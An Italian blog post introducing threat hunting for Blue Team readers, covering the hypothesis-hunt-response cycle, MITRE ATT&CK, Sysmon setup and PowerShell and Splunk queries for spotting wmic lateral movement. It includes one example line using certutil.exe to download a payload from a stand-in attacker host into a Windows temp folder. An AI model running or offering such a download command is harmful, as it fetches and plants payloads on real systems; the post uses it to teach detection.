---
layout: post
title: "Threat Hunting: smettila di aspettare che suoni l'allarme"
description: "Introduzione al Threat Hunting: cos'è, perché è diverso dal monitoraggio passivo e come iniziare a cacciare minacce nella tua rete."
date: 2026-02-01
categoria: Blue Team
tags: [threat-hunting, soc, blue-team, dfir]
---

# Threat Hunting: smettila di aspettare che suoni l'allarme

C'è una cosa che ho imparato dopo aver passato ore a studiare incidenti reali: **gli attaccanti bravi non fanno rumore**. Non triggherano alert, non mandano firme note agli IDS, non lasciano tracce ovvie. Si muovono piano, come se conoscessero la tua rete meglio di te.

Il problema con la sicurezza tradizionale è che è **reattiva**. Aspetti che qualcosa rompa una regola, poi intervieni. Il Threat Hunting ribalta questa logica: non aspetti l'allarme, vai tu a cercare il problema.

---

## Cos'è il Threat Hunting

Il Threat Hunting è la pratica di cercare **proattivamente** minacce all'interno di una rete o sistema, partendo dall'assunzione che l'attaccante sia **già dentro**.

Non è monitoraggio passivo. Non è risposta agli alert. È caccia attiva, guidata da ipotesi, dati e intuizione.

La definizione che preferisco è questa:

> *"Il Threat Hunting è l'arte di cercare ciò che i tuoi strumenti automatici non hanno trovato."*

---

## Perché i sistemi automatici non bastano

SIEM, IDS, EDR, antivirus — tutti strumenti fondamentali, intendiamoci. Ma hanno un limite strutturale: **conoscono solo ciò che è già stato visto**.

Un attaccante che usa tecniche nuove, varianti custom di malware, o semplici strumenti legittimi di Windows (LOLBins) passa sotto al radar con una facilità imbarazzante.

Esempio classico: un attaccante usa `certutil.exe`, uno strumento legittimo di Windows, per scaricare un payload:

```cmd
certutil.exe -urlcache -split -f http://evil.example.com/payload.exe C:\Windows\Temp\update.exe
```

Zero alert. Zero firme. Eppure stai guardando un attacco in corso.

---

## Il ciclo del Threat Hunting

Un buon processo di hunting si articola in tre fasi:

### 1. Ipotesi (Hypothesis)

Tutto parte da una domanda. Non si caccia "a caso" — si parte da un'idea su cosa potrebbe stare succedendo.

Le ipotesi possono nascere da:
- **Intelligence esterna**: nuove TTP pubblicate da threat actor noti (es. gruppi APT)
- **Anomalie nei dati**: qualcosa nel log che non torna, anche se non è un alert
- **Esperienza**: "ho visto questo schema in altri incidenti"

Esempio di ipotesi:
> *"Sospetto che ci sia movimento laterale tramite WMI sulla nostra rete Windows."*

### 2. Caccia (Hunt)

Con l'ipotesi in mano, si raccolgono e si analizzano i dati. Qui entrano in gioco query su log, correlazione eventi, analisi di processi, connessioni di rete.

Esempio: cercare esecuzioni anomale di `wmic` nei log Windows (Event ID 4688):

```powershell
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4688 -and $_.Message -like "*wmic*"
} | Select-Object TimeCreated, Message | Format-List
```

Oppure, se hai un SIEM tipo Splunk:

```spl
index=windows EventCode=4688 Process_Name="*wmic.exe"
| table _time, ComputerName, Account_Name, Process_Command_Line
| sort - _time
```

### 3. Risposta (Response)

Trovato qualcosa? Documentalo, isola il sistema se necessario, passa al team di Incident Response. Non trovato nulla? Ottimo — hai comunque migliorato la tua visibilità e raffinato il processo.

---

## I framework di riferimento

### MITRE ATT&CK

Se non lo conosci ancora, ATT&CK è la tua bibbia. È una knowledge base di tattiche, tecniche e procedure (TTP) usate da attori reali. Ogni voce ha esempi, detection e mitigazioni.

Quando costruisci un'ipotesi di hunting, parti da ATT&CK e chiediti:
> *"Quale tecnica potrebbe usare un attaccante in questa fase? Come si manifesta nei log?"*

### The ThreatHunting Project

Una risorsa meno nota ma preziosa: [threathunting.net](https://www.threathunting.net) raccoglie centinaia di ipotesi di hunting pronte all'uso, mappate su ATT&CK.

---

## Da dove iniziare se parti da zero

Non serve una piattaforma enterprise da milioni di euro. Puoi iniziare con:

1. **Windows Event Logs** — abilita audit avanzato (Process Creation, Network Connections, PowerShell logging)
2. **Sysmon** — gratuito, potentissimo, ti dà visibilità su processi, connessioni, file
3. **Elastic Stack** — per indicizzare e cercare i log
4. **Sigma** — regole di detection in formato portabile

Configurazione base di Sysmon con il config di SwiftOnSecurity:

```bash
# Scarica Sysmon
# https://docs.microsoft.com/sysinternals/downloads/sysmon

# Installa con il config raccomandato
sysmon64.exe -accepteula -i sysmonconfig.xml
```

---

## Una cosa che mi ha sorpreso

Quando ho iniziato a fare hunting sul serio, la cosa che mi ha colpito di più non è stata trovare malware. È stata la quantità di **roba legittima ma strana** che si trovava in giro: script PowerShell dimenticati, task schedulati di dubbia provenienza, connessioni verso IP di cloud pubblici non documentati.

La tua rete probabilmente ha più segreti di quanti pensi. Il Threat Hunting è il modo migliore per scoprirli — prima che lo faccia qualcun altro.

---

## Conclusione

Il Threat Hunting non è per tutti. Richiede curiosità, pazienza, conoscenza tecnica e una buona dose di paranoia sana. Ma è una delle discipline più potenti nel Blue Team, perché porta la sicurezza da posizione reattiva a posizione proattiva.

Nel prossimo articolo parleremo di **analisi malware base** — perché una volta che trovi qualcosa durante una caccia, devi sapere cosa ti trovi davanti.

Stay paranoid. 🔍
